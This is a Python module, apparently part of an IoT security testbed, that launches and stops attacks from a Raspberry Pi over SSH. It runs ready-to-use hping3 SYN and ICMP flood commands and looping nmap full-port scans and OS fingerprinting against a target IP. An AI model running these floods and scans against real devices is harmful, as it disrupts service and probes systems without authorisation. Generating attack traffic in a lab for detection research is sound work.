import asyncio
import subprocess
from logging import getLogger

logger = getLogger("PowerGuardLogger")
attack_process = None

async def start_attack(args):
    global attack_process
    process_name = None

    logger.info(f"🔨 Starting {args.attack} attack from Pi...")

    try:
        if args.attack == "syn_flood":
            command = ["ssh", f"{args.pi_user}@{args.pi_ip}", f"sudo hping3 -S -I wlan0 -p 55443 -i u1000 --flood {args.device_ip}"]
            process_name = "hping3"
        elif args.attack == "icmp_flood":
            command = ["ssh", f"{args.pi_user}@{args.pi_ip}", f"sudo hping3 --icmp --flood {args.device_ip}"]
            process_name = "hping3"
        elif args.attack == "port_scan":
            command = ["ssh", f"{args.pi_user}@{args.pi_ip}", f"bash -c 'while true; do sudo nmap -sS -p- {args.device_ip}; sleep 1; done'"]
            process_name = "nmap"
        elif args.attack == "os_fingerprint":
            command = ["ssh", f"{args.pi_user}@{args.pi_ip}", f"timeout 60s bash -c 'while true; do sudo nmap -O --osscan-guess -p- {args.device_ip}; done'"]
            process_name = "nmap"
        else:
            raise ValueError(f"Unsupported attack type: {args.attack}")

        attack_process = await asyncio.create_subprocess_exec(
            *command,
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.DEVNULL
        )

        if attack_process and attack_process.pid:
            logger.info(f"✅ Attack subprocess launched locally (PID {attack_process.pid}). Assuming attack is running.")
        else:
            logger.warning("⚠️ Attack subprocess may not have launched correctly (no PID reported).")

        return process_name

    except Exception as e:
        logger.error(f"❌ Failed to start attack: {e}")
        return None

async def stop_attack(args, process_name):
    global attack_process
    logger.info("🛡️ Stopping attack on Pi...")

    if attack_process:
        try:
            attack_process.terminate()
            await attack_process.wait()
            logger.info("✅ Attack process terminated.")
        except ProcessLookupError:
            logger.warning("⚠️ Attack process already terminated.")

    # Cleanup **only the specific process**
    try:
        subprocess.run([
            "ssh", f"{args.pi_user}@{args.pi_ip}",
            f"sudo pkill {process_name}"
        ], check=True)
        logger.info(f"✅ Cleaned up process: {process_name}")
    except subprocess.CalledProcessError:
        logger.info(f"No {process_name} process running (already stopped).")
